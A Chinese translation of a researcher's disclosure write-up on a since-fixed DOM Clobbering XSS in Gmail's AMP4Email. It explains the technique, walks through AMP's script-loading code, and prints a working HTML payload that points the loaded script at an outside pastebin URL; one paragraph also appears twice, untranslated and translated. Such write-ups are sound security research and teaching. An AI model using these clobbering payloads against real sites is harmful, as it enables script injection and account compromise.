# 通过 DOM Clobbering 发现 GMail AMP4Email 的 XSS 漏洞

>原文：[XSS in GMail’s AMP4Email via DOM Clobbering](https://research.securitum.com/xss-in-amp4email-dom-clobbering/)
>
>译者：[neal1991](https://github.com/neal1991)
>
>welcome to star my [articles-translator](https://github.com/neal1991/articles-translator/), providing you advanced articles translation. Any suggestion, please issue or contact [me](mailto:bing@stu.ecnu.edu.cn)
>
>LICENSE: [MIT](https://opensource.org/licenses/MIT)

这篇文章是我在2019年8月通过[ Google 漏洞奖励计划](https://www.google.com/about/appsecurity/reward-program/)报告的 AMP4Email 中已经修复的 XSS 的文章。该 XSS 是对著名浏览器问题 DOM Clobbering 的真实利用案例。

## 什么是 AMP4Email

AMP4Email（也称为动态邮件）是 Gmail 的一项新功能，可以让电子邮件包含动态 HTML 内容。尽管撰写包含 HTML 标签的电子邮件已经很多年了，但通常认为 HTML 仅包含静态内容，即某种格式，图像等，没有任何脚本或表单。 AMP4Email 打算更进一步，允许电子邮件中包含动态内容。 在[ Google 官方 G Suite 官方博客中的帖子](https://gsuiteupdates.googleblog.com/2019/06/dynamic-email-in-gmail-becoming-GA.html)中，对动态邮件的使用案例进行了很好的总结 

> **通过动态邮件，你可以轻松地直接从消息本身直接操作，例如对事件进行快速回复，填写问卷，浏览目录或回复评论。**

> **以在 Google 文档中进行评论为例。现在，你将不再在有人在评论中提及你时接收到单独的电子邮件通知，而是会在 Gmail 中看到最新的主题，你可以在邮件中直接从中轻松回复或解决评论。**

该功能引发了一些明显的安全性问题。最重要的一个可能是：跨站点脚本（XSS）？如果我们允许电子邮件中包含动态内容，是否意味着我们可以轻松地注入任意 JavaScript 代码？好吧，答案是否定的；没那么容易。

AMP4Email 具有[强验证器](https://github.com/ampproject/amphtml/blob/master/validator/validator-main.protoascii)，简而言之，它是允许在动态邮件中使用的标签和属性的强大白名单。你可以在 https://amp.gmail.dev/playground/ 上尝试，你还可以给自己发送动态电子邮件来研究工作原理！

![Mceabq.png](https://s2.ax1x.com/2019/11/18/Mceabq.png)
图1. AMP4Email playground

如果你尝试添加验证器未明确允许的任何 HTML 元素或属性，则会收到错误消息。

![McmnWF.png](https://s2.ax1x.com/2019/11/18/McmnWF.png)
图2. AMP 验证器禁止使用任意脚本标签

在使用 AMP4Email 并尝试各种方法绕过它时，我注意到标签中不允许 id 属性（图3）。

![McuZ2F.png](https://s2.ax1x.com/2019/11/18/McuZ2F.png)
图3.不允许使用属性 id

这看起来像是开始安全分析的好地方，因为创建具有用户控制的id属性的HTML元素可能会导致 [DOM Clobbering](http://www.thespanner.co.uk/2013/05/16/dom-clobbering/)。

## DOM Clobbering

DOM Clobbering 是 web 浏览器的遗留功能，给许多应用程序带来麻烦。基本上，当你在 HTML 中创建一个元素（例如 `<input id = username>`），然后希望从 JavaScript 引用该元素时，通常会使用`document.getElementById('username')` 或者 `document.querySelector('＃username')` 之类的函数。但这不是唯一的方法！

传统的方法是仅通过全局 `window` 对象的属性来访问它。因此，在这种情况下，`window.username` 与 `document.getElementById('username')` 完全相同！如果应用程序基于某些全局变量的存在做出决定（例如，`if（window.isAdmin）{...}`），则此行为（称为 DOM Cloberring）可能导致有趣的漏洞。

为了进一步分析 DOM Clobbering，假设我们有以下 JavaScript 代码：

```javascript
if (window.test1.test2) {
    eval(''+window.test1.test2)
}
```

我们的工作是通过仅使用 DOM Cloberring 技术执行任意 JS 代码。要完成这个任务，我们需要找到两个问题的解决方案

1. 我们知道可以在 `window` 上创建新属性，但是可以在其他对象上创建新属性（比如 `test1.test2`）吗？
2. 我们可以控制 DOM 元素如何转换为字符串吗？大多数 HTML 元素在转换为字符串时，返回的内容类似于 `[object HTMLInputElement]`。

让我们从第一个问题开始。最常被引用的解决方法是使用 `<form>` 标签。标签 `<form>` 的每个子元素 `<input>` 都被添加为 `<form>` 的属性，该属性的名称和 `<input>` 的 `name` 属性相同。考虑以下示例：

```javascript
<form id=test1>
  <input name=test2>
</form>
<script>
  alert(test1.test2); // alerts "[object HTMLInputElement]"
</script>
```

为了解决第二个问题，我创建了一个简短的 JS 代码，该代码对 HTML 中所有可能的元素进行了迭代，并检查它们的 `toString` 方法是否继承自 `Object.prototype` 还是以其他方式定义的。如果它们不继承自`Object.prototype`，则可能会返回除 `[object SomeElement]` 外的其他内容。

代码如下：

```javascript
Object.getOwnPropertyNames(window)
.filter(p => p.match(/Element$/))
.map(p => window[p])
.filter(p => p && p.prototype && p.prototype.toString !== Object.prototype.toString)
```

该代码返回两个元素：`HTMLAreaElement`（`<area>`）和 `HTMLAnchorElement`（`<a>`）。 AMP4Email 中不允许使用第一个，因此仅关注第二个。如果是 `<a>` 元素，则 `toString` 仅返回 `href` 属性的值。考虑示例：

```javascript
<a id=test1 href=https://securitum.com>
<script>
  alert(test1); // alerts "https://securitum.com"
</script>
```

在这一点上，似乎我们想解决最初的问题（比如通过 DOM Clobbering 获取 `window.test1.test2` 的值），我们需要类似于以下代码：

```javascript
<form id=test1>
  <a name=test2 href="x:alert(1)"></a>
</form>
```

问题在于它根本不起作用；`test1.test2` 将会是 `undefined`。 尽管 `<input>` 元素确实成为了 `<form>` 的属性，但 `<a>` 没有发生变化。

这个问题有一个有趣的解决方法，不过仅仅适用于基于 WebKit 以及 Blink 内核的浏览器。假设我们有两个具有相同 id 的元素：

```javascript
<a id=test1>click!</a>
<a id=test1>click2!</a>
```

So what we’re going to get when accessing `window.test1`? I’d intuitively expect getting the first element with that id (this is what happens when you try to call `document.getElementById('#test1')`. In Chromium, however, we actually get an `HTMLCollection`!


Fig 4. window.test1 points to HTMLCollection

What is particularly interesting here (and that can be spotted in fig. 4) is that the we can access specific elements in that `HTMLCollection` via index (0 and 1 in the example) as well as by `id`. This means that `window.test1.test1` actually refers to the first element. It turns out that setting `name` attribute would also create new properties in the `HTMLCollection`. So now we have the following code:

那么访问 `window.test1` 时我们将得到什么？我直觉上希望得到具有该 id 的第一个元素（当你尝试调用`document.getElementById('＃test1')` 时会发生这种情况。但是，在 Chromium 中，我们实际上得到了一个`HTMLCollection`！

![McKGoq.png](https://s2.ax1x.com/2019/11/18/McKGoq.png)
图4. window.test1 指向 HTMLCollection

这里特别有趣的是（可以在图4中看到），我们可以通过索引（示例中的0和1）以及通过 id 访问该 HTMLCollection 中的特定元素。 这意味着 `window.test1.test1` 实际上是指第一个元素。 事实证明，设置 `name` 属性也会在 `HTMLCollection` 中创建新属性。 所以现在我们有以下代码：

```html
<a id=test1>click!</a>
<a id=test1 name=test2>click2!</a>
```
我们可以通过 `window.test1.test2` 访问第二个锚元素。

![Mc53RA.png](https://s2.ax1x.com/2019/11/19/Mc53RA.png)
图5. 我们可以定义 window.test1.test2


因此，回到通过 DOM Clobbering 利用 `eval(''+ window.test1.test2)` 的原始练习，解决方案是：

```html
<a id="test1"></a><a id="test1" name="test2" href="x:alert(1)"></a>
```

现在让我们回到 AMP4Email，看看如何在实际情况下如何利用 DOM Clobbering。

## 在 AMP4Email 利用 DOM Clobbering

我已经提到过，通过向元素添加我自己的 id 属性，AMP4Email 可能容易受到 DOM Clobbering 的攻击。为了找到可利用的条件，我决定看一下 `window` 的属性（图6）。立即引起注意的是开头的 AMP。

![Mc5DRs.png](https://s2.ax1x.com/2019/11/19/Mc5DRs.png)
图6. window 全局对象的属性

在这一点上，事实证明 AMP4Email 实际上对 DOM Clobbering 采取了某种保护措施，因为它严格禁止 id 属性的某些值，例如：`AMP`（图7）。

![Mc56s0.png](https://s2.ax1x.com/2019/11/19/Mc56s0.png)
图7. AMP 是 AMP4Email 中的 id 的无效值

但是，AMP_MODE并没有发生相同的限制。所以我准备了一个代码 `<a id=AMP_MODE>` 看看会发生什么……

…然后我注意到控制台中有一个非常有趣的错误（图8）。

![Mc5WoF.png](https://s2.ax1x.com/2019/11/19/Mc5WoF.png)
图8. 加载某些JS文件的 404 错误


如图8 所示，AMP4Email 尝试加载某些JS文件，但由于 404 而未能加载。但是，特别引人注目的是，URL中间存在 `undefined`。

（https://cdn.ampproject.org/rtv/undefined/v0/amp-auto-lightbox-0.1.js）。我能够想出的唯一一个合理的解释：AMP 尝试获取 `AMP_MODE` 的属性以将其放入URL。由于 DOM Clobbering，缺少了预期的属性，因此是 `undefined`。包含代码的代码如下所示：

```javascript
f.preloadExtension = function(a, b) {
            "amp-embed" == a && (a = "amp-ad");
            var c = fn(this, a, !1);
            if (c.loaded || c.error)
                var d = !1;
            else
                void 0 === c.scriptPresent && (d = this.win.document.head.querySelector('[custom-element="' + a + '"]'),
                c.scriptPresent = !!d),
                d = !c.scriptPresent;
            if (d) {
                d = b;
                b = this.win.document.createElement("script");
                b.async = !0;
                yb(a, "_") ? d = "" : b.setAttribute(0 <= dn.indexOf(a) ? "custom-template" : "custom-element", a);
                b.setAttribute("data-script", a);
                b.setAttribute("i-amphtml-inserted", "");
                var e = this.win.location;
                t().test && this.win.testLocation && (e = this.win.testLocation);
                if (t().localDev) {
                    var g = e.protocol + "//" + e.host;
                    "about:" == e.protocol && (g = "");
                    e = g + "/dist"
                } else
                    e = hd.cdn;
                g = t().rtvVersion;
                null == d && (d = "0.1");
                d = d ? "-" + d : "";
                var h = t().singlePassType ? t().singlePassType + "/" : "";
                b.src = e + "/rtv/" + g + "/" + h + "v0/" + a + d + ".js";
                this.win.document.head.appendChild(b);
                c.scriptPresent = !0
            }
            return gn(c)
        }
```

尽管阅读起来不是特别困难，但下面是手动去混淆的代码（为了更清晰，省略了某些部分）：

```javascript
var script = window.document.createElement("script");
script.async = false;
 
var loc;
if (AMP_MODE.test && window.testLocation) {
    loc = window.testLocation
} else {
    loc = window.location;
}
 
if (AMP_MODE.localDev) {
    loc = loc.protocol + "//" + loc.host + "/dist"
} else {
    loc = "https://cdn.ampproject.org";
}
 
var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "";
b.src = loc + "/rtv/" + AMP_MODE.rtvVersion; + "/" + singlePass + "v0/" + pluginName + ".js";
 
document.head.appendChild(b);
```

因此，在第1行中，代码创建了一个新的 `script` 元素。然后，检查 `AMP_MODE.test` 和 `window.testLocation` 是否存在。如果是这样，并且 AMP_MODE.localDev 为真（第11行），则将`window.testLocation` 作为生成脚本URL的基础。然后，在第17和18行中，将其他一些属性连接起来以形成完整的URL。虽然乍一看可能并不明显，但是由于代码的编写方式以及 DOM Clobbering，我们实际上可以控制完整的URL。让我们假设 `AMP_MODE.localDev` 和 `AMP_MODE.test` 为真，代码会进一步简化：

```javascript
var script = window.document.createElement("script");
script.async = false;
 
b.src = window.testLocation.protocol + "//" + 
        window.testLocation.host + "/dist/rtv/" + 
        AMP_MODE.rtvVersion; + "/" + 
        (AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "") + 
        "v0/" + pluginName + ".js";
 
document.head.appendChild(b);
````

你还记得我们之前通过 DOM Clobbering 重载 `window.test1.test2` 的练习吗？现在我们需要做同样的事情，只要重载 `window.testLocation.protocol`。因此，最终的有效载荷：

```html
<!-- We need to make AMP_MODE.localDev and AMP_MODE.test truthy-->
<a id="AMP_MODE"></a>
<a id="AMP_MODE" name="localDev"></a>
<a id="AMP_MODE" name="test"></a>

<!-- window.testLocation.protocol is a base for the URL -->
<a id="testLocation"></a>
<a id="testLocation" name="protocol" 
   href="https://pastebin.com/raw/0tn8z0rG#"></a>
```

实际上，由于在 AMP 中部署了 Content-Security-Policy，因此代码在实际情况下无法执行：

```
Content-Security-Policy: default-src 'none'; 
script-src 'sha512-oQwIl...==' 
  https://cdn.ampproject.org/rtv/ 
  https://cdn.ampproject.org/v0.js 
  https://cdn.ampproject.org/v0/
```

我没有找到绕过 CSP 的方法，但是在尝试绕过 CSP 时，我发现了一种绕过基于目录的 CSP的 有趣方法，并且[我在推特上发表了](https://twitter.com/SecurityMB/status/1162690916722839552) （后来发现在 [2016年CTF中已经使用了相同的技巧](https://blog.0daylabs.com/2016/09/09/bypassing-csp/)）。Google在其漏洞赏金计划中，实际上并不期望绕过 CSP 但依然支付全部赏金。这仍然是一个有趣的挑战。 也许其他人会找到绕过的方法🙂

## 总结

本文中，我已经展示了在满足某些条件的情况下如何使用 DOM Clobbering 执行XSS。这肯定是一个有趣的旅程！如果你想玩这些 XSS 练习，可以看看我的基于这种 XSS 的 XSS 挑战。

### 时间线

* 2019年8月15日 - 报告给谷歌
* 2019年8月16日 - “nice catch!”，
* 2019年9月10日 - 收到谷歌的回应：“这个漏洞很有价值，谢谢报告！”，
* 2019年10月12日 - 谷歌确认漏洞已经修复（尽管现实中之前就已经修复了）
* 2019年11月18日 - 发表。
